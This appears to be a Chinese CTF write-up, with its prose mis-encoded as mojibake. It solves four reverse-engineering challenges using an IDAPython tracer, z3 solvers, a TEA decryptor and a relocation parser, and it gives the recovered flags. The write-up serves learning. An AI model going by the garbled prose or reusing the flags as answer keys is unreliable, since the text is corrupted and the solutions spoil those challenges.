[{"content":"find_basic æ²¡ä¿å­˜è¿‡ç¨‹æ•°æ®ï¼Œä»¥åæ‰¾æ—¶é—´å†è¡¥å§\nç”¨ IDA æŸ¥çœ‹ï¼Œèƒ½å¤Ÿå‘ç°åç¼–è¯‘ç»“æœå¾ˆå¥‡æ€ªï¼Œçœ‹çœ‹åæ±‡ç¼–å°±èƒ½å¤Ÿå‘ç°å­˜åœ¨å¾ˆå¤š pusha å’Œ call ä¹‹ç±»çš„æŒ‡ä»¤ï¼Œä¸å¦‚å¯¹ç€æ±‡ç¼–åŠ¨è°ƒ\nåŠ¨è°ƒåå› ä¸ºä¸å¥½æ‰¾æ ¸å¿ƒé€»è¾‘çš„ä½ç½®ï¼Œæ‰€ä»¥åœ¨è¾“å…¥å¤„ä¸‹ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼Œå‘ç°å–å‡ºäº†è¾“å…¥çš„ç¬¬ä¸€ä½å†…å®¹ï¼Œç„¶åè¿›è¡Œä¹˜æ³•å’Œç´¯åŠ ï¼Œç±»ä¼¼ä¸‹é¢è¿™æ®µä»£ç ï¼š\nADD EAX,0x11 MOVZX EAX,byte ptr [EAX] MOVZX EAX,AL IMUL EAX,EAX,-0x35cf6 ä¸»é€»è¾‘åœ¨0x750a9çš„ä½ç½®ï¼Œç»§ç»­è·Ÿè¸ªä¸€ä¸‹é€»è¾‘ï¼Œæ•´ä½“ç›¸å½“äºnä¸ªè™šæ‹Ÿæœºï¼Œç»“æ„å¤§æ¦‚å¦‚ä¸‹ï¼š\nfather_func@0x750a9: MOV CL, 0x?? CALL son_func son_func: CMP CL, 0x?? JMP ??? CMP CL, 0x?? JMP ??? æ¯ä¸ªå­å‡½æ•°çš„å¼€å¤´å’Œç»“å°¾éƒ½æœ‰ä¸€äº›ç±»ä¼¼è¯æŒ‡ä»¤çš„é€»è¾‘ï¼Œä½†åŠ¨è°ƒå‘ç°å¥½åƒä¸å½±å“ç¨‹åºçš„é€»è¾‘ï¼Œæ‰€ä»¥å°±å¿½ç•¥äº†\nè·Ÿè¸ªäº†å‡ ä¸ªéªŒè¯ç”¨çš„é€»è¾‘åï¼Œå‘ç°ä¸»è¦æ˜¯ä¹˜æ³•å’Œç´¯åŠ ï¼Œè¯´æ˜åº”è¯¥æ˜¯ä¸€ä¸ªçŸ©é˜µè¿ç®—ï¼Œè€ƒè™‘åˆ°å·¥ä½œé‡å¾ˆå¤§ï¼Œé‚£å°±éœ€è¦æƒ³åŠæ³•è¿›è¡Œè‡ªåŠ¨æå–äº†\nä½¿ç”¨äº† idapython è¿›è¡Œè‡ªåŠ¨è°ƒè¯•ï¼Œå¹¶è®°å½•è¿‡ç¨‹ä¸­è¿è¡Œçš„æŒ‡ä»¤ï¼š\nfrom binascii import hexlify ea = get_reg_value(\u0026#39;eip\u0026#39;) end = ea + 0x1806 main_func = get_func_name(ea) fp = open(\u0026#39;all_asm.txt\u0026#39;,\u0026#39;w\u0026#39;) while True: ea = get_reg_value(\u0026#39;eip\u0026#39;) next_ea = next_head(ea) fp.write(hexlify(get_bytes(ea, next_ea - ea)).decode()) fp.write(\u0026#39;\\t\u0026#39; + GetDisasm(ea)+\u0026#39;\\n\u0026#39;) if ea \u0026gt;= end: break if main_func == get_func_name(ea): step_into() else: step_over() wait_for_next_event(WFNE_SUSP, -1) éœ€è¦å…ˆåŠ¨è°ƒåˆ°è¦æå–çš„å‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤\nè¿™æ®µä»£ç æŠŠæ‰€æœ‰æ‰§è¡Œçš„æŒ‡ä»¤éƒ½æå–äº†å‡ºæ¥ï¼Œè¿™æ ·ä¹Ÿèƒ½å¤ŸéªŒè¯ä¸€ä¸‹ä¹‹å‰çš„åˆ†æç»“æœæ˜¯å¦æ­£ç¡®\nè§‚å¯Ÿæå–ç»“æœå‘ç°ï¼Œå¯ä»¥æ ¹æ®æ ¸å¿ƒé€»è¾‘çš„ä¸Šä¸‹æŒ‡ä»¤è¿›è¡Œå®šä½ï¼Œä½äº jnz ä¹‹åï¼Œjmp ä¹‹å‰ï¼š\ncodes = open(\u0026#39;all_asm.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split(\u0026#39;\\n\u0026#39;) c = open(\u0026#39;asm.txt\u0026#39;, \u0026#39;w\u0026#39;) for i in range(len(codes)): if codes[i].find(\u0026#39;jnz\u0026#39;) != -1 and codes[i+2].find(\u0026#39;jnz\u0026#39;) == -1: j = i+3 while j \u0026lt; len(codes) and codes[j].find(\u0026#39;jmp\u0026#39;) == -1: c.write(codes[j]+\u0026#39;\\n\u0026#39;) j += 1 codes = open(\u0026#39;asm.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split(\u0026#39;\\n\u0026#39;) codes = [i[:i.find(\u0026#39;\\t\u0026#39;)] for i in codes] datas = b\u0026#39;\u0026#39; for i in codes: datas += unhexlify(i) datas += \u0026#39;\\xc3\u0026#39; print(datas) open(\u0026#39;mch1\u0026#39;, \u0026#39;wb\u0026#39;).write(datas) ä¹‹å‰æå–çš„æ—¶å€™åŒæ—¶æ‰“å°äº†æŒ‡ä»¤çš„äºŒè¿›åˆ¶ä»£ç ï¼Œä¸»è¦åŸå› æ˜¯æå–çš„æŒ‡ä»¤æ— æ³•ä½¿ç”¨ nasm ç¼–è¯‘ï¼Œç”¨ pwntools é€Ÿåº¦åˆå¤ªæ…¢ï¼Œä¸å¦‚ç›´æ¥æå–\næå–åˆ°çš„å†…å®¹ç›´æ¥åç¼–è¯‘å°±å¥½äº†ï¼Œå¾—åˆ°ä¸€ä¸ªå¤§é•¿ä¸²çš„å¼å­\næç¤ºè¯´æ˜¯éœ€è¦å¯¹æ¯ä¸ªå¼å­å–ç»å¯¹å€¼ï¼Œé‚£å°±æŒ‰ç…§æ¯æ¬¡å‡å¸¸æ•°æ¥åˆ‡å‰²å°±è¡Œï¼Œæœ€åçš„ä»£ç å¦‚ä¸‹ï¼š\nfrom z3 import * a1 = [BitVec(\u0026#39;x%d\u0026#39; % i, 32)for i in range(28)] con1 = 40085 * a1[3] - 222506 * a1[2] + 54507 * a1[4] + 88056 * a1[1] + 212571 * a1[5] - 160722 * a1[0] - 434973 con2 = 49300 * a1[3] + 259229 * a1[0] + 278066 * a1[2] - 127937 * a1[1] - 295169 * a1[4] - 8368677 con3 = 42214 * a1[1] - 108025 * a1[3] + 205972 * a1[0] + 27559 * a1[2] - 17114904 con4 = - 151496 * a1[1] + 204740 * a1[0] + 80143 * a1[2] - 12295783 con5 = 241935 * a1[1] + 124128 * a1[0] - 38790036 con6 = 273221 * a1[0] - 27868542 con7 = -279656 * a1[2] - 199574 * a1[1] - 258130 * a1[8] - 200399 * a1[3] - 173903 * a1[7] + 175816 * a1[0] - 234569 * a1[6] - 108273 * a1[4] - 222957 * a1[5] + 128244179 con8 = - 81541 * a1[1] - 268763 * a1[0] + 219073 * a1[3] + 34782 * a1[6] + 21153 * a1[5] + 173005 * a1[7] + 76285 * a1[4] + 32825 * a1[2] - 13874925 con9 = 85214 * a1[2] - 268299 * a1[3] - 230981 * a1[1] + 290772 * a1[5] - 74394 * a1[4] + 28044 * a1[6] - 242995 * a1[0] + 50871139 con10 = -279656 * a1[2] - 199574 * a1[1] - 258130 * a1[8] - 200399 * a1[3] - 173903 * a1[7] + 175816 * a1[0] - 234569 * a1[6] - 108273 * a1[4] - 222957 * a1[5] + 128244179 con11 = - 81541 * a1[1] - 268763 * a1[0] + 219073 * a1[3] + 34782 * a1[6] + 21153 * a1[5] + 173005 * a1[7] + 76285 * a1[4] + 32825 * a1[2] - 13874925 con12 = 85214 * a1[2] - 268299 * a1[3] - 230981 * a1[1] + 290772 * a1[5] - 74394 * a1[4] + 28044 * a1[6] - 242995 * a1[0] + 50871139 con13 = -208564 * a1[0] + 81934 * a1[9] - 106641 * a1[7] + 198477 * a1[2] + 154505 * a1[1] + 48440 * a1[5] - 149004 * a1[3] - 108909 * a1[4] - 51714 * a1[10] - 296420 * a1[8] + 263021 * a1[6] + 688726 con14 = - 131130 * a1[2] + 224265 * a1[3] + 230702 * a1[0] - 176285 * a1[7] - 274778 * a1[4] + 103848 * a1[8] - 136039 * a1[9] - 241151 * a1[5] + 15542 * a1[6] - 17521 * a1[1] + 41644083 con15 = 195056 * a1[4] - 15717 * a1[9] - 180214 * a1[6] - 114427 * a1[5] + 277782 * a1[7] + 261379 * a1[8] - 225266 * a1[2] + 107609 * a1[0] + 259792 * a1[3] + 270563 * a1[11] + 205124 * a1[1] + 138334 * a1[10] + 103474 * a1[12] - 117027475 con16 = 189573 * a1[8] + 64393 * a1[6] + 231137 * a1[1] + 145315 * a1[4] - 53938 * a1[10] - 291345 * a1[5] + 216413 * a1[3] - 204681 * a1[0] - 65519 * a1[9] - 262826 * a1[2] + 187002 * a1[7] + 271732 * a1[11] - 38663722 con17 = 15645 * a1[13] + 276267 * a1[12] + 31190 * a1[5] - 244002 * a1[2] + 81415 * a1[3] - 22940 * a1[10] - 126076 * a1[7] + 8932 * a1[8] + 112153 * a1[4] + 194218 * a1[11] + 197656 * a1[9] - 204463 * a1[0] - 219500 * a1[1] + 19777 * a1[6] - 24531260 con18 = 279969 * a1[8] - 123977 * a1[4] + 162094 * a1[0] - 215769 * a1[1] - 18878 * a1[14] - 80292 * a1[11] - 237675 * a1[5] - 222121 * a1[6] + 269381 * a1[12] + 153934 * a1[13] - 165380 * a1[10] - 157137 * a1[2] - 186748 * a1[3] + 170756 * a1[7] - 186932 * a1[9] + 87264470 con19 = -87190 * a1[2] - 74836 * a1[1] + 16892 * a1[9] - 185781 * a1[8] - 12726 * a1[7] + 85022 * a1[12] + 232989 * a1[10] + 68516 * a1[0] - 120254 * a1[6] - 204892 * a1[5] - 65901 * a1[4] - 201087 * a1[13] + 158612 * a1[11] - 49445 * a1[3] - 181860 * a1[14] - 111015 * a1[15] + 43646834 con20 = -170184 * a1[3] - 137671 * a1[4] - 85374 * a1[9] - 73658 * a1[11] + 230891 * a1[13] + 54346 * a1[15] - 280694 * a1[0] + 60411 * a1[2] + 27171 * a1[7] - 50618 * a1[6] + 11843 * a1[10] + 131778 * a1[5] + 13956 * a1[8] - 42562 * a1[12] - 19972 * a1[1] - 145797 * a1[14] - 58717 * a1[16] + 74613584 con21 = 242475 * a1[16] - 234385 * a1[0] + 124653 * a1[2] - 287929 * a1[13] - 190916 * a1[12] - 277578 * a1[11] + 39 * a1[8] - 41625 * a1[6] + 67262 * a1[5] - 250144 * a1[9] - 70886 * a1[10] - 223492 * a1[15] - 179651 * a1[7] + 206538 * a1[17] + 161965 * a1[3] - 146258 * a1[4] + 167068 * a1[1] + 196330 * a1[14] + 76353817 con22 = 29700 * a1[18] - 60542 * a1[5] + 274107 * a1[11] + 154914 * a1[13] - 143185 * a1[12] + 167424 * a1[2] + 137439 * a1[8] - 186151 * a1[10] - 77157 * a1[9] - 233090 * a1[6] - 27400 * a1[7] - 76557 * a1[15] - 108002 * a1[17] + 103161 * a1[14] - 133956 * a1[1] - 219502 * a1[4] - 202897 * a1[0] - 250957 * a1[3] - 119297 * a1[16] + 100812197 con23 = -171971 * a1[9] + 38740 * a1[4] - 31661 * a1[10] - 194653 * a1[18] - 295910 * a1[16] + 136489 * a1[12] + 212619 * a1[17] + 165592 * a1[11] + 211791 * a1[1] + 156909 * a1[2] - 232187 * a1[8] - 73709 * a1[7] + 79735 * a1[14] + 184882 * a1[13] + 111105 * a1[6] + 148840 * a1[3] - 35774 * a1[19] - 275711 * a1[0] + 135265 * a1[5] - 141221 * a1[15] - 39117122 con24 = -186514 * a1[17] - 7791 * a1[2] + 276755 * a1[11] - 294815 * a1[14] - 238763 * a1[15] - 146099 * a1[5] + 184977 * a1[16] + 178413 * a1[1] + 287303 * a1[3] - 71946 * a1[10] - 73771 * a1[9] - 129032 * a1[18] + 200202 * a1[20] - 150509 * a1[6] - 156625 * a1[13] + 14093 * a1[7] + 192584 * a1[12] - 122770 * a1[0] - 255494 * a1[8] + 65 * a1[4] - 108479 * a1[19] + 13521895 con25 = 210978 * a1[7] + 300336 * a1[10] + 207254 * a1[15] + 216206 * a1[5] - 63529 * a1[0] - 274903 * a1[11] - 10750 * a1[14] + 25008 * a1[4] - 100942 * a1[19] - 104857 * a1[2] + 266501 * a1[8] + 229070 * a1[17] - 234559 * a1[16] + 298459 * a1[3] - 172052 * a1[6] - 98938 * a1[12] + 66155 * a1[13] - 84761 * a1[1] - 283508 * a1[18] + 288577 * a1[21] - 75407 * a1[20] - 204447 * a1[9] + 4351595 con26 = -201846 * a1[14] + 272550 * a1[20] + 60398 * a1[6] + 45580 * a1[7] + 195108 * a1[11] + 38596 * a1[0] + 220445 * a1[18] - 190873 * a1[15] + 103477 * a1[9] + 118842 * a1[19] + 206336 * a1[10] - 249940 * a1[17] - 48084 * a1[21] + 104901 * a1[5] - 48576 * a1[4] + 287104 * a1[16] - 286686 * a1[1] - 30253 * a1[22] + 121183 * a1[3] + 90967 * a1[2] - 195519 * a1[12] - 129304 * a1[8] + 141188 * a1[13] - 56642147 con27 = 110609 * a1[4] + 5913 * a1[21] - 197578 * a1[7] + 45127 * a1[18] + 282426 * a1[13] - 71019 * a1[16] - 6980 * a1[11] + 208216 * a1[15] - 13544 * a1[20] + 17852 * a1[8] + 167833 * a1[12] + 145568 * a1[17] + 3610 * a1[19] + 91985 * a1[1] - 267402 * a1[5] - 32355 * a1[14] - 197823 * a1[23] + 135525 * a1[2] - 229424 * a1[22] + 38093 * a1[10] + 50167 * a1[6] + 118713 * a1[9] + 123874 * a1[0] - 89499 * a1[3] - 43090537 con28 = -164755 * a1[9] + 175470 * a1[8] - 28660 * a1[1] + 7217 * a1[11] - 295102 * a1[4] - 28531 * a1[19] - 106265 * a1[25] - 92750 * a1[10] + 16738 * a1[21] - 231714 * a1[6] + 172042 * a1[24] - 215890 * a1[17] + 199697 * a1[12] - 84235 * a1[7] + 44614 * a1[13] + 75104 * a1[5] - 195843 * a1[0] - 15784 * a1[14] - 131950 * a1[15] - 268167 * a1[16] - 197565 * a1[20] + 24340 * a1[23] + 105130 * a1[2] - 79750 * a1[22] - 264668 * a1[3] + 50329 * a1[18] + 137774797 con28 = 62119 * a1[17] - 17215 * a1[24] + 289621 * a1[18] + 53006 * a1[20] + 95969 * a1[11] + 202404 * a1[0] + 247060 * a1[21] + 144211 * a1[19] + 280106 * a1[7] - 126431 * a1[10] - 226837 * a1[12] + 10463 * a1[23] + 121257 * a1[13] - 84190 * a1[9] + 88917 * a1[1] + 15453 * a1[14] + 271442 * a1[4] + 110851 * a1[3] - 231422 * a1[5] + 176741 * a1[22] + 266134 * a1[2] - 197327 * a1[6] - 55225 * a1[8] - 265465 * a1[15] + 119612 * a1[16] - 98514358 con29 = 62119 * a1[17] - 17215 * a1[24] + 289621 * a1[18] + 53006 * a1[20] + 95969 * a1[11] + 202404 * a1[0] + 247060 * a1[21] + 144211 * a1[19] + 280106 * a1[7] - 126431 * a1[10] - 226837 * a1[12] + 10463 * a1[23] + 121257 * a1[13] - 84190 * a1[9] + 88917 * a1[1] + 15453 * a1[14] + 271442 * a1[4] + 110851 * a1[3] - 231422 * a1[5] + 176741 * a1[22] + 266134 * a1[2] - 197327 * a1[6] - 55225 * a1[8] - 265465 * a1[15] + 119612 * a1[16] - 98514358 con30 = 151924 * a1[25] - 265311 * a1[6] + 107604 * a1[11] - 47851 * a1[24] + 227178 * a1[13] - 162699 * a1[2] + 2171 * a1[20] + 211070 * a1[23] + 94815 * a1[22] + 124760 * a1[16] + 41462 * a1[19] - 277022 * a1[15] - 62501 * a1[26] - 17727 * a1[14] - 257908 * a1[4] - 175112 * a1[21] + 8972 * a1[10] - 71801 * a1[8] - 114724 * a1[5] - 252898 * a1[9] + 161457 * a1[1] - 64461 * a1[0] - 111493 * a1[18] + 200145 * a1[17] - 290075 * a1[3] + 158466 * a1[12] - 275262 * a1[7] + 86899519 con31 = 142850 * a1[18] - 166704 * a1[1] + 284852 * a1[22] + 248972 * a1[7] - 76200 * a1[17] + 261708 * a1[19] + 91911 * a1[24] + 22347 * a1[3] + 76006 * a1[21] + 256511 * a1[6] - 100052 * a1[14] - 115830 * a1[2] - 93202 * a1[23] + 248858 * a1[12] - 262669 * a1[10] + 67895 * a1[5] - 111771 * a1[8] - 132193 * a1[11] - 141512 * a1[13] + 139406 * a1[27] + 109646 * a1[16] - 286309 * a1[9] + 175476 * a1[15] + 138067 * a1[20] + 192825 * a1[25] + 199577 * a1[0] - 63091 * a1[4] - 285207 * a1[26] - 58820340 s = Solver() for i in range(28): s.add(a1[i] \u0026gt; 0x20) s.add(a1[i] \u0026lt; 0x7f) s.add(a1[0] == ord(\u0026#39;f\u0026#39;)) s.add(a1[1] == ord(\u0026#39;l\u0026#39;)) s.add(a1[2] == ord(\u0026#39;a\u0026#39;)) s.add(a1[3] == ord(\u0026#39;g\u0026#39;)) s.add(a1[4] == ord(\u0026#39;{\u0026#39;)) s.add(a1[27] == ord(\u0026#39;}\u0026#39;)) s.add(con1 == 0) s.add(con2 == 0) s.add(con3 == 0) s.add(con4 == 0) s.add(con5 == 0) s.add(con6 == 0) s.add(con7 == 0) s.add(con8 == 0) s.add(con9 == 0) s.add(con10 == 0) s.add(con11 == 0) s.add(con12 == 0) s.add(con13 == 0) s.add(con14 == 0) s.add(con15 == 0) s.add(con16 == 0) s.add(con17 == 0) s.add(con18 == 0) s.add(con19 == 0) s.add(con20 == 0) s.add(con21 == 0) s.add(con22 == 0) s.add(con23 == 0) s.add(con24 == 0) s.add(con25 == 0) s.add(con26 == 0) s.add(con27 == 0) s.add(con28 == 0) s.add(con29 == 0) s.add(con30 == 0) s.add(con31 == 0) if sat == s.check(): m = s.model() flag = \u0026#39;\u0026#39; for i in a1: flag += chr(m[i].as_long()) import hashlib hl = hashlib.md5() hl.update(flag.encode()) print (hl.hexdigest() == \u0026#39;042905954c2c27f21bd74489ea0d151f\u0026#39;) print (flag) GameMaster .neté€†å‘\nä¸€ä¸ª21ç‚¹æ¸¸æˆï¼Œé€†å‘å‘ç°å­˜åœ¨ä½œå¼Šç \nif (memcmp1(input, \u0026#34;MF3K\u0026#34;, 4)) { try { game.Player.Bet -= 22m; for (int i = 0; i \u0026lt; memory.Length; i++) { memory[i] ^= 34; } Environment.SetEnvironmentVariable(\u0026#34;AchivePoint1\u0026#34;, game.Player.Balance.ToString()); return; } } if (memcmp1(input, \u0026#34;EEPW\u0026#34;, 4)) { try { game.Player.Balance += 175m; byte[] key = new byte[16] { 66, 114, 97, 105, 110, 115, 116, 111, 114, 109, 105, 110, 103, 33, 33, 33 }; RijndaelManaged rijndaelManaged = new RijndaelManaged(); rijndaelManaged.Key = key; rijndaelManaged.Mode = CipherMode.ECB; rijndaelManaged.Padding = PaddingMode.Zeros; ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(); m = cryptoTransform.TransformFinalBlock(memory, 0, memory.Length); Environment.SetEnvironmentVariable(\u0026#34;AchivePoint2\u0026#34;, game.Player.Balance.ToString()); return; } } if (memcmp1(input, \u0026#34;6VD6\u0026#34;, 4)) { try { game.Player.Balance -= 27m; Environment.SetEnvironmentVariable(\u0026#34;AchivePoint3\u0026#34;, game.Player.Balance.ToString()); BinaryFormatter binaryFormatter = new BinaryFormatter(); MemoryStream serializationStream = new MemoryStream(m); binaryFormatter.Deserialize(serializationStream); return; } } ä¾æ¬¡è§¦å‘ä¸‰ä¸ªä½œå¼Šç ï¼Œå°±ä¼šå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè§£å¯†å¹¶ååºåˆ—åŒ–\nè§£å¯†åå‘ç°åºåˆ—åŒ–å†…å®¹ä¸­åŒ…å«äº†ä¸€ä¸ªdllæ–‡ä»¶ï¼š\nprivate static void Check1(ulong x, ulong y, ulong z, byte[] KeyStream) { int num = -1; for (int i = 0; i \u0026lt; 320; i++) { x = (((x \u0026gt;\u0026gt; 29 ^ x \u0026gt;\u0026gt; 28 ^ x \u0026gt;\u0026gt; 25 ^ x \u0026gt;\u0026gt; 23) \u0026amp; 1UL) | x \u0026lt;\u0026lt; 1); y = (((y \u0026gt;\u0026gt; 30 ^ y \u0026gt;\u0026gt; 27) \u0026amp; 1UL) | y \u0026lt;\u0026lt; 1); z = (((z \u0026gt;\u0026gt; 31 ^ z \u0026gt;\u0026gt; 30 ^ z \u0026gt;\u0026gt; 29 ^ z \u0026gt;\u0026gt; 28 ^ z \u0026gt;\u0026gt; 26 ^ z \u0026gt;\u0026gt; 24) \u0026amp; 1UL) | z \u0026lt;\u0026lt; 1); bool flag = i % 8 == 0; if (flag) { num++; } KeyStream[num] = (byte)((long)((long)KeyStream[num] \u0026lt;\u0026lt; 1) | (long)((ulong)((uint)((z \u0026gt;\u0026gt; 32 \u0026amp; 1UL \u0026amp; (x \u0026gt;\u0026gt; 30 \u0026amp; 1UL)) ^ (((z \u0026gt;\u0026gt; 32 \u0026amp; 1UL) ^ 1UL) \u0026amp; (y \u0026gt;\u0026gt; 31 \u0026amp; 1UL)))))); } } private static void ParseKey(ulong[] L, byte[] Key) { for (int i = 0; i \u0026lt; 3; i++) { for (int j = 0; j \u0026lt; 4; j++) { Key[i * 4 + j] = (byte)(L[i] \u0026gt;\u0026gt; j * 8 \u0026amp; 255UL); } } } public T1() { try { string environmentVariable = Environment.GetEnvironmentVariable(\u0026#34;AchivePoint1\u0026#34;); string environmentVariable2 = Environment.GetEnvironmentVariable(\u0026#34;AchivePoint2\u0026#34;); string environmentVariable3 = Environment.GetEnvironmentVariable(\u0026#34;AchivePoint3\u0026#34;); bool flag = environmentVariable == null || environmentVariable2 == null || environmentVariable3 == null; if (!flag) { ulong num = ulong.Parse(environmentVariable); ulong num2 = ulong.Parse(environmentVariable2); ulong num3 = ulong.Parse(environmentVariable3); ulong[] array = new ulong[3]; byte[] array2 = new byte[40]; byte[] array3 = new byte[40]; byte[] array4 = new byte[12]; byte[] first = new byte[] { 101, 5, 80, 213, 163, 26, 59, 38, 19, 6, 173, 189, 198, 166, 140, 183, 42, 247, 223, 24, 106, 20, 145, 37, 24, 7, 22, 191, 110, 179, 227, 5, 62, 9, 13, 17, 65, 22, 37, 5 }; byte[] array5 = new byte[] { 60, 100, 36, 86, 51, 251, 167, 108, 116, 245, 207, 223, 40, 103, 34, 62, 22, 251, 227 }; array[0] = num; array[1] = num2; array[2] = num3; T1.Check1(array[0], array[1], array[2], array2); bool flag2 = first.SequenceEqual(array2); if (flag2) { T1.ParseKey(array, array4); for (int i = 0; i \u0026lt; array5.Length; i++) { array5[i] ^= array4[i % array4.Length]; } MessageBox.Show(\u0026#34;flag{\u0026#34; + Encoding.Default.GetString(array5) + \u0026#34;}\u0026#34;, \u0026#34;Congratulations!\u0026#34;, MessageBoxButtons.OK); } } } catch (Exception) { } } ä½¿ç”¨ z3 æ±‚è§£ä¸‰ä¸ªç¯å¢ƒå˜é‡\nfrom z3 import * x = BitVec(\u0026#39;x\u0026#39;, 64) y = BitVec(\u0026#39;y\u0026#39;, 64) z = BitVec(\u0026#39;z\u0026#39;, 64) flag1 = [ 101, 5, 80, 213, 163, 26, 59, 38, 19, 6, 173, 189, 198, 166, 140, 183, 42, 247, 223, 24, 106, 20, 145, 37, 24, 7, 22, 191, 110, 179, 227, 5, 62, 9, 13, 17, 65, 22, 37, 5 ] s = Solver() for i in range(320): x = (((x \u0026gt;\u0026gt; 29 ^ x \u0026gt;\u0026gt; 28 ^ x \u0026gt;\u0026gt; 25 ^ x \u0026gt;\u0026gt; 23) \u0026amp; 1) | x \u0026lt;\u0026lt; 1) y = (((y \u0026gt;\u0026gt; 30 ^ y \u0026gt;\u0026gt; 27) \u0026amp; 1) | y \u0026lt;\u0026lt; 1) z = (((z \u0026gt;\u0026gt; 31 ^ z \u0026gt;\u0026gt; 30 ^ z \u0026gt;\u0026gt; 29 ^ z \u0026gt;\u0026gt; 28 ^ z \u0026gt;\u0026gt; 26 ^ z \u0026gt;\u0026gt; 24) \u0026amp; 1) | z \u0026lt;\u0026lt; 1) cur = ((z \u0026gt;\u0026gt; 32) \u0026amp; 1 \u0026amp; (x \u0026gt;\u0026gt; 30 \u0026amp; 1)) ^ ((((z \u0026gt;\u0026gt; 32) \u0026amp; 1) ^ 1) \u0026amp; ((y \u0026gt;\u0026gt; 31) \u0026amp; 1)) s.add(cur == (flag1[i // 8] \u0026gt;\u0026gt; (7 - i % 8)) \u0026amp; 1) if s.check() == sat: m = s.model() print (m) else: print (\u0026#39;no res\u0026#39;) æ±‚è§£ï¼Œæˆ–åŠ¨è°ƒæ”¹å†…å­˜\narray = [156324965, 868387187, 3131229747] Key = [0] * 12 for i in range(3): for j in range(4): Key[i * 4 + j] = (array[i] \u0026gt;\u0026gt; (j * 8)) \u0026amp; 0xff print (Key) cipher = [60, 100, 36, 86, 51, 251, 167, 108, 116, 245, 207, 223, 40, 103, 34, 62, 22, 251, 227] for i in range(len(cipher)): print (chr(cipher[i] ^ Key[i % len(Key)]), end=\u0026#39;\u0026#39;) Easyapk é€»è¾‘åœ¨ so å±‚ï¼Œæœ‰å¤§é‡çš„åƒåœ¾æŒ‡ä»¤ï¼Œå®é™…é€»è¾‘æ˜¯å…ˆè¿›è¡Œ rot13ï¼Œå†è¿›è¡Œ tea åŠ å¯† è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; //è§£å¯†å‡½æ•° void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i\u0026lt;32; i++) { /* basic cycle start */ v1 -= ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); v0 -= ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } int main() { uint32_t v[]={1570024068u, 351937696u, 727056912u, 3063668041u, 2867849940u, 1267528902u, 159365321u, 3052163538u},k[4]={0x33323130, 0x37363534, 0x62613938, 0x66656463}; // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ printf(\u0026#34;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); decrypt(v, k); decrypt(v + 2, k); decrypt(v + 4, k); decrypt(v + 6, k); unsigned char *x = (unsigned char *)v; for (int i = 0; i \u0026lt; 32; i++) { printf(\u0026#34;%x\u0026#34;, x[i]); } return 0; } // synt{Vg_Vf_A0g_guNg_zHpu_unEqre} ç»“æœè¿›è¡Œrot13å³å¯\nflag{It_Is_N0t_thAt_mUch_haRder} deeprev è¿™é“é¢˜ä¸€å¼€å§‹æ‰¾ä¸åˆ°é€»è¾‘ï¼Œåæ¥åœ¨ check ä¸‹æ–­ç‚¹ï¼Œæ–­åœ¨äº† ld ä¸­ï¼Œçœ‹ä¸€ä¸‹å„ä¸ªæ®µçš„å¤§å°ï¼Œå‘ç°reloéƒ¨åˆ†å¾ˆå¤§ï¼Œè¯´æ˜é€»è¾‘åº”è¯¥è—åœ¨äº†é“¾æ¥è¿‡ç¨‹ä¸­\nåæ¥å‘ç°æ˜¯ä»¿ç…§ google ctf eldar é‚£é¢˜çš„ï¼Œç›´æ¥å€Ÿç”¨åˆ«äººçš„è„šæœ¬\nimport lief from collections import namedtuple from dataclasses import dataclass b = lief.ELF.parse(\u0026#39;./deeprev\u0026#39;) def to_sym(name): assert len(name) == 1 return ord(name[0]) Rel = namedtuple(\u0026#39;REL\u0026#39;, [\u0026#39;dst\u0026#39;, \u0026#39;val\u0026#39;, \u0026#39;ridx\u0026#39;]) Copy = namedtuple(\u0026#39;CPY\u0026#39;, [\u0026#39;dst\u0026#39;, \u0026#39;symbol\u0026#39;, \u0026#39;ridx\u0026#39;]) R64 = namedtuple(\u0026#39;R64\u0026#39;, [\u0026#39;dst\u0026#39;, \u0026#39;symbol\u0026#39;, \u0026#39;addend\u0026#39;, \u0026#39;ridx\u0026#39;]) R32 = namedtuple(\u0026#39;R32\u0026#39;, [\u0026#39;dst\u0026#39;, \u0026#39;symbol\u0026#39;, \u0026#39;addend\u0026#39;, \u0026#39;ridx\u0026#39;]) @dataclass class Symbol(object): idx: int def __repr__(self): return f\u0026#39;s{self.idx}\u0026#39; @dataclass class Reloc(object): idx: int def __repr__(self): return f\u0026#39;r{self.idx}\u0026#39; @dataclass class Ref(object): def __repr__(self): return f\u0026#39;\u0026amp;{self.val}\u0026#39; @dataclass class SymAddr(object): sym: Symbol field: str def __repr__(self): return f\u0026#39;{self.sym}.{self.field}\u0026#39; @dataclass class RelocAddr(object): reloc: Reloc field: str def __repr__(self): return f\u0026#39;{self.reloc}.{self.field}\u0026#39; def vaddr(self): off = 0 print(self.field) # match self.field: # case \u0026#39;r_address\u0026#39;: off = 0 # case \u0026#39;r_info\u0026#39;: off = 8 # case \u0026#39;r_addend\u0026#39;: off = 16 return (self.reloc.idx * 24) + off + rela.virtual_address @dataclass class FlagAddr(object): idx: int def __repr__(self): return f\u0026#39;flag[{self.idx}]\u0026#39; BaseAddr = namedtuple(\u0026#39;baseaddr\u0026#39;, []) CheckAddr = namedtuple(\u0026#39;check\u0026#39;, []) 